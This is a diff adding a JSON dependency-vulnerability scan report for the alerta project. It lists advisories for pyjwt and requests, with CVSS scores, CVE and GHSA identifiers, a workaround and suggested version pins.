+            "CWE-347"
+          ],
+          "GHSA": [
+            "GHSA-jq35-7prp-9v3f"
+          ]
+        },
+        "packageName": "pyjwt",
+        "proprietary": false,
+        "creationTime": "2026-05-29T07:44:32.027065Z",
+        "functions_new": [],
+        "alternativeIds": [],
+        "disclosureTime": "2026-05-28T16:50:17.233000Z",
+        "exploitDetails": {
+          "sources": [
+            "Snyk"
+          ],
+          "maturityLevels": [
+            {
+              "type": "secondary",
+              "level": "Proof of Concept",
+              "format": "CVSSv3"
+            },
+            {
+              "type": "primary",
+              "level": "Proof of Concept",
+              "format": "CVSSv4"
+            }
+          ]
+        },
+        "packageManager": "pip",
+        "publicationTime": "2026-05-29T07:44:32.232509Z",
+        "severityBasedOn": "CVSS",
+        "modificationTime": "2026-06-24T11:13:02.152713Z",
+        "socialTrendAlert": false,
+        "packagePopularityRank": 99,
+        "from": [
+          "alerta__alerta@0.0.0",
+          "pyjwt@2.12.1"
+        ],
+        "upgradePath": [],
+        "isUpgradable": false,
+        "isPatchable": false,
+        "isPinnable": true,
+        "isRuntime": false,
+        "name": "pyjwt",
+        "version": "2.12.1",
+        "severityWithCritical": "medium"
+      },
+      {
+        "id": "SNYK-PYTHON-REQUESTS-15763443",
+        "title": "Insecure Temporary File",
+        "CVSSv3": "CVSS:3.1/AV:L/AC:H/PR:L/UI:R/S:U/C:N/I:H/A:N",
+        "credit": [
+          "Jaycelation"
+        ],
+        "semver": {
+          "vulnerable": [
+            "[,2.33.0)"
+          ]
+        },
+        "exploit": "Not Defined",
+        "fixedIn": [
+          "2.33.0"
+        ],
+        "patches": [],
+        "insights": {
+          "triageAdvice": null
+        },
+        "language": "python",
+        "severity": "medium",
+        "cvssScore": 4.1,
+        "functions": [],
+        "malicious": false,
+        "isDisputed": false,
+        "moduleName": "requests",
+        "references": [
+          {
+            "url": "https://github.com/psf/requests/commit/66d21cb07bd6255b1280291c4fafb71803cdb3b7",
+            "title": "GitHub Commit"
+          },
+          {
+            "url": "https://github.com/psf/requests/security/advisories/GHSA-gc5v-m9x4-r6x2",
+            "title": "Maintainer's Advisory"
+          }
+        ],
+        "cvssDetails": [
+          {
+            "assigner": "Red Hat",
+            "severity": "medium",
+            "cvssV3Vector": "CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:N/I:H/A:N",
+            "cvssV3BaseScore": 4.7,
+            "modificationTime": "2026-03-29T08:59:54.578156Z"
+          },
+          {
+            "assigner": "NVD",
+            "severity": "medium",
+            "cvssV3Vector": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N",
+            "cvssV3BaseScore": 5.5,
+            "modificationTime": "2026-03-31T01:21:52.868372Z"
+          },
+          {
+            "assigner": "SUSE",
+            "severity": "medium",
+            "cvssV3Vector": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N",
+            "cvssV3BaseScore": 5.5,
+            "modificationTime": "2026-05-02T14:41:29.183085Z"
+          }
+        ],
+        "cvssSources": [
+          {
+            "type": "primary",
+            "vector": "CVSS:4.0/AV:L/AC:H/AT:N/PR:L/UI:P/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N",
+            "assigner": "Snyk",
+            "severity": "medium",
+            "baseScore": 4.1,
+            "cvssVersion": "4.0",
+            "modificationTime": "2026-06-24T02:02:06.573078Z"
+          },
+          {
+            "type": "secondary",
+            "vector": "CVSS:3.1/AV:L/AC:H/PR:L/UI:R/S:U/C:N/I:H/A:N",
+            "assigner": "Snyk",
+            "severity": "medium",
+            "baseScore": 4.4,
+            "cvssVersion": "3.1",
+            "modificationTime": "2026-06-24T02:02:06.573078Z"
+          },
+          {
+            "type": "secondary",
+            "vector": "CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:N/I:H/A:N",
+            "assigner": "Red Hat",
+            "severity": "medium",
+            "baseScore": 4.7,
+            "cvssVersion": "3.1",
+            "modificationTime": "2026-03-29T08:59:54.578156Z"
+          },
+          {
+            "type": "secondary",
+            "vector": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N",
+            "assigner": "NVD",
+            "severity": "medium",
+            "baseScore": 5.5,
+            "cvssVersion": "3.1",
+            "modificationTime": "2026-03-31T01:21:52.868372Z"
+          },
+          {
+            "type": "secondary",
+            "vector": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N",
+            "assigner": "SUSE",
+            "severity": "medium",
+            "baseScore": 5.5,
+            "cvssVersion": "3.1",
+            "modificationTime": "2026-05-02T14:41:29.183085Z"
+          }
+        ],
+        "description": "## Overview\n\nAffected versions of this package are vulnerable to Insecure Temporary File via the `extract_zipped_paths` function. An attacker can leverage unauthorized file replacement by pre-creating a malicious file in the system's temporary directory prior to extraction.\r\n\r\n**Note:** Only applications that call extract_zipped_paths() directly are impacted.\r\n\r\n## Workaround \r\nThis vulnerability can be mitigated by setting the `TMPDIR` environment variable to a directory with restricted write access.\n## Remediation\nUpgrade `requests` to version 2.33.0 or higher.\n## References\n- [GitHub Commit](https://github.com/psf/requests/commit/66d21cb07bd6255b1280291c4fafb71803cdb3b7)\n- [Maintainer's Advisory](https://github.com/psf/requests/security/advisories/GHSA-gc5v-m9x4-r6x2)\n",
+        "epssDetails": {
+          "percentile": "0.07900",
+          "probability": "0.00182",
+          "modelVersion": "v2026.06.15"
+        },
+        "identifiers": {
+          "CVE": [
+            "CVE-2026-25645"
+          ],
+          "CWE": [
+            "CWE-377"
+          ],
+          "GHSA": [
+            "GHSA-5qvp-pr9f-2g2v",
+            "GHSA-gc5v-m9x4-r6x2"
+          ]
+        },
+        "packageName": "requests",
+        "proprietary": false,
+        "creationTime": "2026-03-25T17:32:25.715695Z",
+        "functions_new": [],
+        "alternativeIds": [],
+        "disclosureTime": "2026-03-25T16:56:28Z",
+        "exploitDetails": {
+          "sources": [],
+          "maturityLevels": [
+            {
+              "type": "secondary",
+              "level": "Not Defined",
+              "format": "CVSSv3"
+            },
+            {
+              "type": "primary",
+              "level": "Not Defined",
+              "format": "CVSSv4"
+            }
+          ]
+        },
+        "packageManager": "pip",
+        "publicationTime": "2026-03-25T17:32:25.924103Z",
+        "severityBasedOn": "CVSS",
+        "modificationTime": "2026-06-24T02:02:06.573078Z",
+        "socialTrendAlert": false,
+        "packagePopularityRank": 99,
+        "from": [
+          "alerta__alerta@0.0.0",
+          "requests-hawk@1.2.1",
+          "requests@2.32.5"
+        ],
+        "upgradePath": [],
+        "isUpgradable": false,
+        "isPatchable": false,
+        "isPinnable": true,
+        "isRuntime": false,
+        "name": "requests",
+        "version": "2.32.5",
+        "severityWithCritical": "medium"
+      }
+    ],
+    "upgrade": {},
+    "patch": {},
+    "ignore": {},
+    "pin": {
+      "cryptography@46.0.6": {
+        "upgradeTo": "cryptography@48.0.1",
+        "vulns": [
+          "SNYK-PYTHON-CRYPTOGRAPHY-15953315",
+          "SNYK-PYTHON-CRYPTOGRAPHY-17344551"
+        ],
+        "isTransitive": false
+      },
+      "pyjwt@2.12.1": {
+        "upgradeTo": "pyjwt@2.13.0",
+        "vulns": [
+          "SNYK-PYTHON-PYJWT-17053408",
+          "SNYK-PYTHON-PYJWT-17053409",
+          "SNYK-PYTHON-PYJWT-17054465",
+          "SNYK-PYTHON-PYJWT-17054901",
+          "SNYK-PYTHON-PYJWT-17054902"
+        ],
+        "isTransitive": false
+      },
+      "requests@2.32.5": {
+        "upgradeTo": "requests@2.33.0",
+        "vulns": [
+          "SNYK-PYTHON-REQUESTS-15763443"
+        ],
+        "isTransitive": false
+      }
+    }
+  },
+  "filesystemPolicy": false,
+  "filtered": {
+    "ignore": [],
+    "patch": []
+  },
+  "uniqueCount": 8,
+  "projectName": "alerta__alerta",
+  "displayTargetFile": "requirements.txt",
+  "hasUnknownVersions": false,
+  "path": "/work/alerta__alerta"
+}
